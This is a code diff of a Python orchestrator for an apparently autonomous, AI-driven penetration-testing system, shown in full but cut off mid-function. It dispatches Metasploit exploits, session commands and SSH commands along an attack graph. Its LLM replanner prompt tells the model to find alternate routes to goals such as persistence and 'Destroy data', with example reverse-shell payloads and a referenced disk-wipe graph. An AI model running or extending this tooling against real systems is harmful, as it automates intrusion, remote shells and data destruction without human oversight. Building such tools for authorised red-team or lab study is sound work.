@@ -27,14 +27,21 @@ Usage:
     python -m core_agents.orchestrator examples/disk_wipe_graph.json
 """
 
+import re
 import sys
 import json
 import time
+import logging
+from datetime import datetime, timezone
 from pathlib import Path
 from typing import Optional
 
-from core_agents.attack_graph import AttackGraph, AttackNode, NodeStatus
-from core_agents.common import Colors, print_colored, MAX_PIPELINE_RETRIES
+from core_agents.attack_graph import AttackGraph, AttackNode, AttackEdge, EdgeCheck, NodeStatus
+from core_agents.common import (
+    Colors, print_colored, run_ssh_command, call_llm, parse_json_response,
+    MAX_PIPELINE_RETRIES,
+)
+from langchain_core.messages import HumanMessage
 
 from stages.recon import run_recon
 from stages.initial_access import run_exploitation
@@ -44,87 +51,529 @@ from stages.impact import run_impact
 
 
 # =============================================================================
+# LOGGING — file + console, so we can tail progress in real-time
+# =============================================================================
+
+def _setup_logger(graph_name: str) -> logging.Logger:
+    """Create a logger that writes to both console and a per-graph log file."""
+    log_dir = Path("logs")
+    log_dir.mkdir(exist_ok=True)
+
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_file = log_dir / f"{graph_name}_{timestamp}.log"
+
+    logger = logging.getLogger(f"orchestrator.{graph_name}")
+    logger.setLevel(logging.DEBUG)
+    logger.handlers.clear()
+
+    # File handler — everything
+    fh = logging.FileHandler(log_file, encoding="utf-8")
+    fh.setLevel(logging.DEBUG)
+    fh.setFormatter(logging.Formatter(
+        "%(asctime)s [%(levelname)s] %(message)s",
+        datefmt="%H:%M:%S",
+    ))
+    logger.addHandler(fh)
+
+    # Console handler — INFO and above
+    ch = logging.StreamHandler()
+    ch.setLevel(logging.INFO)
+    ch.setFormatter(logging.Formatter("%(message)s"))
+    logger.addHandler(ch)
+
+    logger.info(f"Log file: {log_file}")
+    return logger
+
+
+# =============================================================================
 # SUBAGENT DISPATCH — routes a node to the right stage runner
 # =============================================================================
 
-def dispatch_node(node: AttackNode, graph: AttackGraph) -> dict:
+def dispatch_node(
+    node: AttackNode,
+    graph: AttackGraph,
+    log: logging.Logger = None,
+    explore: bool = False,
+) -> dict:
     """
     Execute a single node by dispatching to the appropriate subagent.
 
-    Reads the node's self-contained config (module, options, objective, etc.)
-    and upstream findings from the graph, then calls the matching stage runner.
-
-    Returns the findings dict from the subagent.
+    Args:
+        explore: If False (default), the subagent MUST follow the node's
+                 module/options/commands exactly. No freelancing.
+                 If True, the subagent may explore alternatives.
     """
     agent_type = node.agent_type
     preceding = graph.gather_preceding_findings(node.id)
+    log = log or logging.getLogger("orchestrator")
 
-    print_colored(
-        f"\n[Orchestrator] Dispatching node '{node.id}' ({node.label}) → agent: {agent_type}",
-        Colors.HEADER,
-    )
+    log.info(f"[Dispatch] node='{node.id}' label='{node.label}' agent={agent_type} explore={explore}")
+    log.debug(f"  objective: {node.objective[:200]}")
+    if node.module:
+        log.debug(f"  module: {node.module}  payload: {node.payload}")
+        log.debug(f"  module_options: {node.module_options}")
+    if node.commands_to_run:
+        log.debug(f"  commands_to_run: {node.commands_to_run}")
     if preceding:
-        print_colored(
-            f"  Preceding findings from: {list(preceding.keys())}",
-            Colors.OKCYAN,
+        for pid, pf in preceding.items():
+            log.info(f"  preceding[{pid}]:")
+            log.info(f"    success: {pf.get('success')}")
+            log.info(f"    summary: {pf.get('summary', '')}")
+            if pf.get("os_detected"):
+                log.info(f"    os: {pf.get('os_detected')}")
+            if pf.get("ports"):
+                ports = pf["ports"]
+                port_str = ", ".join(f"{p.get('port')}/{p.get('service','')}" for p in ports[:20])
+                log.info(f"    ports ({len(ports)}): {port_str}")
+            if pf.get("session_id"):
+                log.info(f"    session: {pf.get('session_id')} ({pf.get('session_type','?')}) level={pf.get('access_level','?')}")
+            if pf.get("method"):
+                log.info(f"    method: {pf.get('method')}")
+            if pf.get("technique"):
+                log.info(f"    technique: {pf.get('technique')}")
+
+    # --- DIRECT EXECUTION: always try first when node has module/commands ---
+    # Skip direct for recon — needs LLM to parse nmap into structured findings
+    if (node.module or node.commands_to_run) and agent_type != "recon":
+        log.info(f"  [direct] Attempting direct execution (no LLM)...")
+        findings = _execute_direct(node, graph, log)
+        if findings.get("success"):
+            return findings
+        # Direct execution failed — return failure, let the walker backtrack
+        log.warning(f"  [{node.id}] Direct execution failed: {findings.get('summary', '?')}")
+        return findings
+
+    # --- LLM STAGE RUNNERS (recon, or nodes without module/commands) ---
+    if agent_type == "recon":
+        return _dispatch_recon(node, graph, preceding, explore)
+    elif agent_type == "exploit":
+        return _dispatch_exploit(node, graph, preceding, explore)
+    elif agent_type == "persistence":
+        return _dispatch_persistence(node, graph, preceding, explore)
+    elif agent_type == "privesc":
+        return _dispatch_privesc(node, graph, preceding, explore)
+    elif agent_type == "impact":
+        return _dispatch_impact(node, graph, preceding, explore)
+    elif agent_type == "discovery":
+        return _dispatch_discovery(node, graph, preceding, explore)
+    else:
+        log.warning(f"  Unknown agent_type '{agent_type}' — skipping node.")
+        return {"success": False, "summary": f"Unknown agent_type: {agent_type}"}
+
+
+# =============================================================================
+# STRICT MODE DIRECTIVE — injected when explore=False
+# =============================================================================
+
+_STRICT_PREFIX = """
+=== MANDATORY DIRECTIVE — STRICT MODE ===
+You MUST follow the EXACT plan below. Do NOT query the knowledge base for
+alternatives. Do NOT choose a different module. Do NOT explore other services.
+Execute ONLY what is specified. If it fails, report the failure — do NOT
+try something else.
+==========================================
+"""
+
+
+def _build_objective(node: AttackNode, graph: AttackGraph, explore: bool) -> str:
+    """Build the objective string, optionally with strict directive."""
+    objective = node.objective or graph.objective
+
+    if node.module:
+        if explore:
+            # Hint — agent may override
+            objective += f"\n\nSUGGESTED MODULE: {node.module}"
+        else:
+            # Strict — agent must follow
+            objective = _STRICT_PREFIX + objective
+            objective += f"\n\nREQUIRED MODULE: {node.module}"
+
+        if node.payload:
+            objective += f"\nPayload: {node.payload}"
+        if node.module_options:
+            objective += f"\nModule options: {json.dumps(node.module_options)}"
+        if node.payload_options:
+            objective += f"\nPayload options: {json.dumps(node.payload_options)}"
+
+        if not explore:
+            # Build exact MSF command sequence for the agent
+            cmds = [f"use {node.module}"]
+            for k, v in node.module_options.items():
+                cmds.append(f"set {k} {v}")
+            if node.payload:
+                cmds.append(f"set PAYLOAD {node.payload}")
+                for k, v in node.payload_options.items():
+                    cmds.append(f"set {k} {v}")
+            cmds.append("run")
+            objective += "\n\nEXACT COMMAND SEQUENCE:\n" + "\n".join(
+                f"  {i+1}. {cmd}" for i, cmd in enumerate(cmds)
+            )
+
+    elif node.commands_to_run:
+        if not explore:
+            objective = _STRICT_PREFIX + objective
+        objective += f"\n\nCOMMANDS TO EXECUTE:\n" + "\n".join(
+            f"  {i+1}. {cmd}" for i, cmd in enumerate(node.commands_to_run)
         )
 
-    if agent_type == "recon":
-        return _dispatch_recon(node, graph, preceding)
-    elif agent_type == "exploit":
-        return _dispatch_exploit(node, graph, preceding)
-    elif agent_type == "persistence":
-        return _dispatch_persistence(node, graph, preceding)
-    elif agent_type == "privesc":
-        return _dispatch_privesc(node, graph, preceding)
-    elif agent_type == "impact":
-        return _dispatch_impact(node, graph, preceding)
-    elif agent_type == "discovery":
-        return _dispatch_discovery(node, graph, preceding)
-    else:
-        print_colored(
-            f"  [WARNING] Unknown agent_type '{agent_type}' — skipping node.",
-            Colors.WARNING,
+    elif not explore:
+        objective = _STRICT_PREFIX + objective
+
+    return objective
+
+
+# =============================================================================
+# DIRECT EXECUTION — bypass LLM in strict mode
+# =============================================================================
+
+def _execute_direct(node: AttackNode, graph: AttackGraph, log: logging.Logger) -> dict:
+    """
+    Execute a node directly without any LLM calls.
+
+    Routes based on tool_name first, then falls back to heuristics:
+      - tool_name="metasploit" + module → structured MSF module execution
+      - tool_name="metasploit" + commands_to_run → raw MSF console commands
+      - tool_name="session" → session commands on target (needs active session)
+      - tool_name="nmap"/"ssh"/etc → SSH commands on Kali
+      - Otherwise: heuristic based on agent_type / preceding session
+    """
+    from tools.metasploit_tools import msf_session
+
+    preceding = graph.gather_preceding_findings(node.id)
+    tool = (node.tool_name or "").lower()
+
+    # Structured MSF module execution
+    if node.module:
+        return _execute_msf_module(node, graph, log, msf_session)
+
+    if not node.commands_to_run:
+        log.warning(f"  [direct] Node has no module or commands — cannot execute directly")
+        return {"success": False, "summary": "No module or commands defined on node"}
+
+    # Route by tool_name first
+    if tool == "metasploit":
+        return _execute_msf_console_commands(node, graph, log, msf_session)
+
+    if tool == "session":
+        session_id, _, _ = _find_session(preceding)
+        if not session_id:
+            return {"success": False, "summary": "tool_name=session but no active session in preceding nodes"}
+        return _execute_session_commands(node, log, msf_session, session_id)
+
+    # Heuristic fallback (no tool_name): if we have a session and node is post-exploitation, use it
+    session_id, _, _ = _find_session(preceding)
+    if session_id and node.agent_type in ("impact", "discovery", "persistence"):
+        return _execute_session_commands(node, log, msf_session, session_id)
+
+    return _execute_ssh_commands(node, log)
+
+
+def _execute_msf_console_commands(
+    node: AttackNode, graph: AttackGraph,
+    log: logging.Logger, msf_session,
+) -> dict:
+    """Execute raw MSF console commands (when no structured module is set)."""
+    target_ip = node.target_ip or graph.target_ip
+    all_output = ""
+    params = _resolve_command_params(node, log)
+
+    for template in node.commands_to_run:
+        cmd = _render_command(template, params)
+        log.info(f"  [direct] msf> {cmd}")
+        output = msf_session.send_command(cmd, timeout=120)
+        node.add_command(cmd, tool="msf_console", output=output, target="msf_console")
+        all_output += output + "\n"
+
+        preview = output.strip()[:300]
+        if preview:
+            log.info(f"  [direct]   {preview}")
+
+    return _parse_msf_output(all_output, node, target_ip, log)
+
+
+def _execute_msf_module(
+    node: AttackNode, graph: AttackGraph,
+    log: logging.Logger, msf_session,
+) -> dict:
+    """Execute a Metasploit module directly via console commands.
+
+    On retries, swap in alternative values from `module_options_alternatives`
+    (or `payload_options_alternatives` if present) based on the current retry
+    count. retries=0 → original options. retries=1 → alts[0]. etc.
+    """
+    target_ip = node.target_ip or graph.target_ip
+
+    # Build effective options using alternatives based on retry count
+    retry_idx = node.retries  # 0 on first attempt, 1 on first retry, ...
+    effective_module_options = dict(node.module_options)
+    effective_payload = node.payload
+    effective_payload_options = dict(node.payload_options)
+    tweaks_applied = []
+
+    if retry_idx > 0 and node.module_options_alternatives:
+        alt_idx = retry_idx - 1  # retries=1 → alts[0]
+        for field_name, alts in node.module_options_alternatives.items():
+            if alt_idx < len(alts):
+                new_value = alts[alt_idx]
+                if field_name == "PAYLOAD":
+                    effective_payload = new_value
+                elif field_name in effective_payload_options:
+                    effective_payload_options[field_name] = new_value
+                else:
+                    effective_module_options[field_name] = new_value
+                tweaks_applied.append(f"{field_name}={new_value}")
+        if tweaks_applied:
+            log.info(f"  [direct] Retry {retry_idx} tweaks: {', '.join(tweaks_applied)}")
+
+    # Build command sequence from effective options
+    cmds = [f"use {node.module}"]
+    for k, v in effective_module_options.items():
+        cmds.append(f"set {k} {v}")
+    if effective_payload:
+        cmds.append(f"set PAYLOAD {effective_payload}")
+        for k, v in effective_payload_options.items():
+            cmds.append(f"set {k} {v}")
+    cmds.append("run")
+
+    # Execute each command
+    all_output = ""
+    for cmd in cmds:
+        log.info(f"  [direct] > {cmd}")
+        output = msf_session.send_command(cmd, timeout=120)
+        node.add_command(cmd, tool="msf_console", output=output, target="msf_console")
+        all_output += output + "\n"
+
+        # Log first 300 chars of output
+        preview = output.strip()[:300]
+        if preview:
+            log.info(f"  [direct]   {preview}")
+
+    # Parse the combined output for results
+    return _parse_msf_output(all_output, node, target_ip, log)
+
+
+def _resolve_command_params(node: AttackNode, log: logging.Logger) -> dict:
+    """
+    Build the effective command_params for the current retry, applying
+    alternatives based on node.retries (same semantics as MSF options).
+    """
+    effective = dict(node.command_params)
+    retry_idx = node.retries
+
+    if retry_idx > 0 and node.command_params_alternatives:
+        alt_idx = retry_idx - 1
+        tweaks = []
+        for field_name, alts in node.command_params_alternatives.items():
+            if alt_idx < len(alts):
+                effective[field_name] = alts[alt_idx]
+                tweaks.append(f"{field_name}={alts[alt_idx]}")
+        if tweaks:
+            log.info(f"  [direct] Retry {retry_idx} command_params tweaks: {', '.join(tweaks)}")
+
+    return effective
+
+
+def _render_command(template: str, params: dict) -> str:
+    """Substitute {name} placeholders in a command string using params."""
+    if not params:
+        return template
+    try:
+        return template.format(**params)
+    except (KeyError, IndexError):
+        # Missing placeholder — return the template untouched
+        return template
+
+
+def _execute_ssh_commands(node: AttackNode, log: logging.Logger) -> dict:
+    """Execute shell commands on Kali via SSH (with templated params)."""
+    all_output = ""
+    success = True
+    params = _resolve_command_params(node, log)
+
+    for template in node.commands_to_run:
+        cmd = _render_command(template, params)
+        log.info(f"  [direct] $ {cmd}")
+        output = run_ssh_command(cmd)
+        node.add_command(cmd, tool="ssh", output=output, target="kali")
+        all_output += output + "\n"
+
+        preview = output.strip()[:300]
+        if preview:
+            log.info(f"  [direct]   {preview}")
+
+        if "failed" in output.lower() or "error" in output.lower():
+            success = False
+
+    return {
+        "success": success,
+        "summary": f"Executed {len(node.commands_to_run)} command(s) on Kali",
+        "output": all_output[:5000],
+    }
+
+
+def _execute_session_commands(
+    node: AttackNode, log: logging.Logger,
+    msf_session, session_id: str,
+) -> dict:
+    """Execute commands on the target through an active MSF session (with templated params)."""
+    all_output = ""
+    success = True
+    params = _resolve_command_params(node, log)
+
+    for template in node.commands_to_run:
+        cmd = _render_command(template, params)
+        log.info(f"  [direct] session({session_id})> {cmd}")
+        output = msf_session.run_session_command(session_id, cmd, timeout=30)
+        node.add_command(cmd, tool="session", output=output, target="target")
+        all_output += output + "\n"
+
+        preview = output.strip()[:300]
+        if preview:
+            log.info(f"  [direct]   {preview}")
+
+        if "error" in output.lower() and "not found" in output.lower():
+            success = False
+
+    return {
+        "success": success,
+        "session_id": session_id,
+        "summary": f"Executed {len(node.commands_to_run)} command(s) on target via session {session_id}",
+        "output": all_output[:5000],
+    }
+
+
+def _parse_msf_output(output: str, node: AttackNode, target_ip: str, log: logging.Logger) -> dict:
+    """
+    Parse Metasploit output to determine success and extract findings.
+
+    Looks for:
+      - "session X opened" → session created
+      - "Login Successful" → credentials found
+      - "Exploit completed, but no session" → failed
+    """
+    findings = {
+        "success": False,
+        "target_ip": target_ip,
+        "exploit_used": node.module,
+        "session_id": "",
+        "session_type": "",
+        "access_level": "unknown",
+        "summary": "",
+    }
+
+    # Check for session opened
+    session_match = re.search(
+        r'(command shell|meterpreter)\s+session\s+(\d+)\s+opened',
+        output, re.IGNORECASE,
+    )
+    if session_match:
+        findings["success"] = True
+        findings["session_type"] = session_match.group(1).lower().replace(" ", "_")
+        findings["session_id"] = session_match.group(2)
+        findings["summary"] = (
+            f"Session {findings['session_id']} ({findings['session_type']}) "
+            f"opened on {target_ip} via {node.module}"
         )
-        return {"success": False, "summary": f"Unknown agent_type: {agent_type}"}
+        log.info(f"  [direct] SESSION OPENED: {findings['summary']}")
+        return findings
+
+    # Check for successful login (ssh_login auxiliary)
+    login_match = re.search(
+        r'Success:\s*[\'"]?(\S+?)[\'"]?\s*:\s*[\'"]?(\S+?)[\'"]?\s',
+        output, re.IGNORECASE,
+    )
+    if not login_match:
+        login_match = re.search(
+            r'Login Successful:\s*(\S+)',
+            output, re.IGNORECASE,
+        )
+    if login_match:
+        findings["success"] = True
+        findings["summary"] = f"Login successful on {target_ip} via {node.module}"
+        log.info(f"  [direct] LOGIN FOUND: {login_match.group(0)}")
+
+        # ssh_login creates a session — check for it
+        session_after = re.search(r'session\s+(\d+)\s+opened', output, re.IGNORECASE)
+        if session_after:
+            findings["session_id"] = session_after.group(1)
+            findings["session_type"] = "command_shell"
+            findings["summary"] += f" — session {findings['session_id']}"
+        return findings
+
+    # Check for explicit failure
+    if "exploit completed, but no session" in output.lower():
+        findings["summary"] = f"Exploit completed but no session created via {node.module}"
+        log.info(f"  [direct] FAILED: no session created")
+    elif "auxiliary module execution completed" in output.lower():
+        findings["summary"] = f"Auxiliary module completed — no credentials found via {node.module}"
+        log.info(f"  [direct] COMPLETED: no credentials found")
+    else:
+        findings["summary"] = f"Module execution completed — result unclear via {node.module}"
+        log.info(f"  [direct] COMPLETED: result unclear, checking output...")
+
+    return findings
+
+
+# =============================================================================
+# HELPERS — extract session/recon info from preceding findings
+# =============================================================================
+
+def _find_session(preceding: dict) -> tuple[str, str, str]:
+    """Find session_id, session_type, access_level from preceding findings."""
+    for pred_id, pf in preceding.items():
+        if "session_id" in pf and pf.get("success"):
+            sid = str(pf["session_id"])
+            stype = pf.get("session_type", "shell")
+            level = pf.get("access_level", "unknown")
+            # Check if a later node escalated
+            if "new_level" in pf and pf.get("success"):
+                level = pf["new_level"]
+            return sid, stype, level
+    return "", "", "unknown"
+
+
+def _find_recon(preceding: dict) -> tuple[dict, str, str]:
+    """Find target_info, raw_nmap, os_info from preceding findings."""
+    target_info = {}
+    raw_nmap = ""
+    os_info = ""
+    for pred_id, pf in preceding.items():
+        if "ports" in pf or "target_info" in pf:
+            target_info = pf.get("target_info", {})
+            raw_nmap = pf.get("raw_nmap_output", "")
+        if "os_detected" in pf:
+            os_info = pf["os_detected"]
+    return target_info, raw_nmap, os_info
 
 
 # =============================================================================
 # DISPATCH IMPLEMENTATIONS — one per agent type
 # =============================================================================
 
-def _dispatch_recon(node: AttackNode, graph: AttackGraph, preceding: dict) -> dict:
-    """Dispatch to the recon stage runner."""
+def _dispatch_recon(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
+    objective = _build_objective(node, graph, explore)
     findings = run_recon(
         target_ip=node.target_ip or graph.target_ip,
-        goal=node.objective or graph.objective,
+        goal=objective,
     )
     return dict(findings)
 
 
-def _dispatch_exploit(node: AttackNode, graph: AttackGraph, preceding: dict) -> dict:
-    """Dispatch to the exploitation stage runner."""
-    # Build target_info from preceding recon findings if available
-    target_info = {"ip": node.target_ip or graph.target_ip}
-    raw_recon = ""
+def _dispatch_exploit(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
+    target_info, raw_recon, _ = _find_recon(preceding)
+    if not target_info:
+        target_info = {"ip": node.target_ip or graph.target_ip}
+    objective = _build_objective(node, graph, explore)
 
-    for pred_id, pred_findings in preceding.items():
-        # Look for recon-like findings
-        if "ports" in pred_findings or "target_info" in pred_findings:
-            target_info = pred_findings.get("target_info", target_info)
-            raw_recon = pred_findings.get("raw_nmap_output", "")
-            break
-
-    # Pass the node's module/options as hint in the objective
-    objective = node.objective or graph.objective
-    if node.module:
-        objective += (
-            f"\n\nSUGGESTED MODULE: {node.module}"
-            f"\nPayload: {node.payload}"
-            f"\nOptions: {json.dumps(node.module_options)}"
-        )
-        if node.payload_options:
-            objective += f"\nPayload options: {json.dumps(node.payload_options)}"
+    # Always trim raw nmap — the full dump causes 187K+ tokens which exceeds
+    # gpt-4o-mini's 128K context limit. The structured target_info.ports has
+    # all the data the LLM needs.
+    ports_list = target_info.get("ports", [])
+    if ports_list:
+        lines = [f"  {p.get('port')}/{p.get('service','')} {p.get('version','')}" for p in ports_list[:30]]
+        raw_recon = f"Open ports on {target_info.get('ip', '')}:\n" + "\n".join(lines)
+    else:
+        raw_recon = ""
 
     findings = run_exploitation(
         target_info=target_info,
@@ -134,36 +583,14 @@ def _dispatch_exploit(node: AttackNode, graph: AttackGraph, preceding: dict) -> 
     return dict(findings)
 
 
-def _dispatch_persistence(node: AttackNode, graph: AttackGraph, preceding: dict) -> dict:
-    """Dispatch to the persistence stage runner."""
-    # Find session info from preceding exploit findings
-    session_id = ""
-    session_type = ""
-    access_level = "unknown"
-
-    for pred_id, pred_findings in preceding.items():
-        if "session_id" in pred_findings and pred_findings.get("success"):
-            session_id = str(pred_findings["session_id"])
-            session_type = pred_findings.get("session_type", "shell")
-            access_level = pred_findings.get("access_level", "unknown")
-            break
-
+def _dispatch_persistence(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
+    session_id, session_type, access_level = _find_session(preceding)
     if not session_id:
         return {
-            "success": False,
-            "method": "",
-            "details": "No active session from preceding nodes.",
+            "success": False, "method": "", "details": "No active session.",
             "summary": "Persistence skipped — no session available.",
         }
-
-    # Pass module hint in objective
-    objective = node.objective or graph.objective
-    if node.module:
-        objective += (
-            f"\n\nSUGGESTED MODULE: {node.module}"
-            f"\nPayload: {node.payload}"
-            f"\nOptions: {json.dumps(node.module_options)}"
-        )
+    objective = _build_objective(node, graph, explore)
 
     findings = run_persistence(
         target_ip=node.target_ip or graph.target_ip,
@@ -175,28 +602,13 @@ def _dispatch_persistence(node: AttackNode, graph: AttackGraph, preceding: dict)
     return dict(findings)
 
 
-def _dispatch_privesc(node: AttackNode, graph: AttackGraph, preceding: dict) -> dict:
-    """Dispatch to the privilege escalation stage runner."""
-    session_id = ""
-    session_type = ""
-    access_level = "unknown"
-    os_info = ""
-
-    for pred_id, pred_findings in preceding.items():
-        if "session_id" in pred_findings and pred_findings.get("success"):
-            session_id = str(pred_findings["session_id"])
-            session_type = pred_findings.get("session_type", "shell")
-            access_level = pred_findings.get("access_level", "unknown")
-        if "os_detected" in pred_findings:
-            os_info = pred_findings["os_detected"]
-
+def _dispatch_privesc(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
+    session_id, session_type, access_level = _find_session(preceding)
+    _, _, os_info = _find_recon(preceding)
     if not session_id:
         return {
-            "success": False,
-            "technique": "",
-            "previous_level": "",
-            "new_level": "",
-            "summary": "PrivEsc skipped — no session available.",
+            "success": False, "technique": "", "previous_level": "",
+            "new_level": "", "summary": "PrivEsc skipped — no session available.",
         }
 
     findings = run_privesc(
@@ -205,45 +617,21 @@ def _dispatch_privesc(node: AttackNode, graph: AttackGraph, preceding: dict) -> 
         session_type=session_type,
         access_level=access_level,
         os_info=os_info,
-        objective=node.objective or graph.objective,
+        objective=_build_objective(node, graph, explore),
     )
     return dict(findings)
 
 
-def _dispatch_impact(node: AttackNode, graph: AttackGraph, preceding: dict) -> dict:
-    """Dispatch to the impact stage runner."""
-    session_id = ""
-    session_type = ""
-    access_level = "unknown"
-
-    for pred_id, pred_findings in preceding.items():
-        if "session_id" in pred_findings and pred_findings.get("success"):
-            session_id = str(pred_findings["session_id"])
-            session_type = pred_findings.get("session_type", "shell")
-            access_level = pred_findings.get("access_level", "unknown")
-        # PrivEsc may have escalated the level
-        if "new_level" in pred_findings and pred_findings.get("success"):
-            access_level = pred_findings["new_level"]
-
+def _dispatch_impact(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
+    session_id, session_type, access_level = _find_session(preceding)
     if not session_id:
         return {
-            "success": False,
-            "actions": [],
+            "success": False, "actions": [],
             "summary": "Impact skipped — no session available.",
         }
 
-    # Build prior findings summary from all predecessors
-    prior_lines = []
-    for pred_id, pred_findings in preceding.items():
-        prior_lines.append(f"{pred_id}: {pred_findings.get('summary', 'N/A')}")
-    prior_summary = "\n".join(prior_lines)
-
-    # Include pre-planned commands in the objective
-    objective = node.objective or graph.objective
-    if node.commands_to_run:
-        objective += f"\n\nPRE-PLANNED COMMANDS:\n" + "\n".join(
-            f"  {i+1}. {cmd}" for i, cmd in enumerate(node.commands_to_run)
-        )
+    prior_lines = [f"{pid}: {pf.get('summary', 'N/A')}" for pid, pf in preceding.items()]
+    objective = _build_objective(node, graph, explore)
 
     findings = run_impact(
         target_ip=node.target_ip or graph.target_ip,
@@ -251,47 +639,21 @@ def _dispatch_impact(node: AttackNode, graph: AttackGraph, preceding: dict) -> d
         session_id=session_id,
         session_type=session_type,
         access_level=access_level,
-        prior_findings_summary=prior_summary,
+        prior_findings_summary="\n".join(prior_lines),
     )
     return dict(findings)
 
 
-def _dispatch_discovery(node: AttackNode, graph: AttackGraph, preceding: dict) -> dict:
-    """
-    Dispatch discovery tasks.
-
-    Discovery reuses the impact runner with a non-destructive objective
-    (enumerate disks, list users, etc.) since both need an active session
-    and run commands on the target.
-    """
-    session_id = ""
-    session_type = ""
-    access_level = "unknown"
-
-    for pred_id, pred_findings in preceding.items():
-        if "session_id" in pred_findings and pred_findings.get("success"):
-            session_id = str(pred_findings["session_id"])
-            session_type = pred_findings.get("session_type", "shell")
-            access_level = pred_findings.get("access_level", "unknown")
-        if "new_level" in pred_findings and pred_findings.get("success"):
-            access_level = pred_findings["new_level"]
-
+def _dispatch_discovery(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
+    session_id, session_type, access_level = _find_session(preceding)
     if not session_id:
         return {
-            "success": False,
-            "actions": [],
+            "success": False, "actions": [],
             "summary": "Discovery skipped — no session available.",
         }
 
-    prior_lines = []
-    for pred_id, pred_findings in preceding.items():
-        prior_lines.append(f"{pred_id}: {pred_findings.get('summary', 'N/A')}")
-
-    objective = node.objective or "Enumerate target system"
-    if node.commands_to_run:
-        objective += f"\n\nPRE-PLANNED COMMANDS:\n" + "\n".join(
-            f"  {i+1}. {cmd}" for i, cmd in enumerate(node.commands_to_run)
-        )
+    prior_lines = [f"{pid}: {pf.get('summary', 'N/A')}" for pid, pf in preceding.items()]
+    objective = _build_objective(node, graph, explore)
 
     findings = run_impact(
         target_ip=node.target_ip or graph.target_ip,
@@ -305,191 +667,598 @@ def _dispatch_discovery(node: AttackNode, graph: AttackGraph, preceding: dict) -
 
 
 # =============================================================================
-# GRAPH WALKER — the main orchestration loop
+# REPLANNER — grow new edges/nodes when the graph is stuck
 # =============================================================================
+
+REPLAN_PROMPT = """You are an attack graph replanner for an autonomous penetration testing system.
+
+You are STUCK at a specific node. The outgoing edges failed their checks, so the
+pre-defined path is blocked. Your job: find an ALTERNATIVE WAY to achieve the
+NEXT GOAL in the chain.
+
+You will receive:
+- OBJECTIVE: the overall attack goal
+- STUCK AT: the node you're at, with its findings (what you have)
+- FAILED EDGES: the edges that failed, with the TARGET NODE'S GOAL
+  (this is what you need to achieve, but differently)
+- REMAINING NODES: unreached nodes and their goals
+
+Your job: achieve the FAILED TARGET'S GOAL using what you have.
+
+For example:
+- Failed edge target had goal "Maintain persistent access" but needed meterpreter
+  → Propose a cron job or SSH key instead (same goal, different method)
+- Failed edge target had goal "Destroy data" but needed root
+  → Propose a privesc step first, then connect to the data destruction node
+
+Propose ONE of:
+1. A new edge to an EXISTING remaining node (if your findings satisfy its needs)
+2. A NEW NODE that achieves the failed target's goal differently
+
+RESPOND IN JSON ONLY:
+```json
+{
+  "action": "new_edge",
+  "target": "existing_node_id",
+  "rationale": "why this connection works with what I have"
+}
+```
+OR for a new MSF exploit module:
+```json
+{
+  "action": "new_node",
+  "id": "new_node_id",
+  "label": "Human readable label",
+  "goal": "same goal as the failed target, or a bridging goal",
+  "agent_type": "exploit",
+  "objective": "specific plan",
+  "tool_name": "metasploit",
+  "module": "exploit/unix/ftp/proftpd_modcopy_exec",
+  "module_options": {"RHOSTS": "...", "RPORT": 21, "SITEPATH": "/var/www"},
+  "module_options_alternatives": {
+    "SITEPATH": ["/var/www/html", "/var/tmp", "/srv/www"],
+    "PAYLOAD": ["cmd/unix/reverse_python", "cmd/unix/reverse_bash"]
+  },
+  "payload": "cmd/unix/reverse_perl",
+  "payload_options": {"LHOST": "...", "LPORT": 4444},
+  "rationale": "why this works"
+}
+```
+NOTE: `module_options_alternatives` lists alternate values to try on retries.
+Include this for fields that are commonly wrong (SITEPATH, PAYLOAD, TARGETURI, etc.).
+The first attempt uses module_options as-is; retry N uses alts[N-1] for each field.
+OR for shell commands on the target via existing session:
+```json
+{
+  "action": "new_node",
+  "id": "new_node_id",
+  "label": "Human readable label",
+  "goal": "same goal as the failed target, or a bridging goal",
+  "agent_type": "impact",
+  "objective": "specific plan",
+  "tool_name": "session",
+  "commands_to_run": [
+    "echo '{marker}' > {target_file}",
+    "cat {target_file}"
+  ],
+  "command_params": {"target_file": "/tmp/pwned.txt", "marker": "PWNED"},
+  "command_params_alternatives": {
+    "target_file": ["/tmp/.proof", "/var/tmp/owned.txt"]
+  },
+  "rationale": "why this works"
+}
+```
+NOTE: For bash/session commands, use `{name}` placeholders inside commands_to_run
+and put the values in `command_params`. Only put TWEAKABLE behavior knobs in
+`command_params_alternatives` — fixed paths/identities stay in `command_params`.
+OR if no viable path exists:
+```json
+{
+  "action": "give_up",
+  "reason": "why there's no path forward"
+}
+```
+
+Rules:
+- FOCUS ON THE GOAL of the failed target node — achieve it differently
+- If the failed target's goal is far from the final objective, bridge toward it
+- If you can skip intermediate goals and jump closer to the objective, DO IT
+- Do NOT propose connecting to nodes marked as FAILED — they already tried and failed
+- If you already proposed an edge that didn't work, propose something DIFFERENT
+- DIVERSIFY across replans: if FTP didn't work, try Samba, IRC, HTTP, etc.
+  Each replan should try a SUBSTANTIALLY different attack vector, not the same
+  exploit with different params (within-node retries already handle param tweaks).
+- Prefer creating NEW NODES with specific commands over reusing failed nodes
+- For MSF modules: ALWAYS use the actual ATTACKER IP from the context for LHOST,
+  and the actual TARGET IP for RHOSTS. NEVER use placeholders like "..." or "<ip>".
+- ONE proposal per call. Keep it concrete and actionable.
+"""
+
+
+def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) -> Optional[str]:
+    """
+    Attempt to grow a new edge from a stuck node.
+
+    Called when the walker reaches a node whose outgoing edges all fail their checks.
+    Asks the LLM to propose the next step from this specific node.
+
+    Returns the target node ID to continue to, or None if replanning failed.
+    """
+    stuck_node = graph.nodes[stuck_node_id]
+    log.info(f"[Replanner] Stuck at '{stuck_node_id}' — asking LLM for next step...")
+
+    # Build compact context
+    trimmed_findings = {k: v for k, v in stuck_node.findings.items()
+                        if k != "raw_nmap_output"}
+
+    # Failed outgoing edges — include target node's goal
+    failed_edges = []
+    for edge in graph.outgoing_edges(stuck_node_id):
+        failed_checks = []
+        for check in edge.checks:
+            if not check.evaluate(stuck_node.findings):
+                failed_checks.append(str(check))
+        if failed_checks or not graph._edge_satisfied(edge):
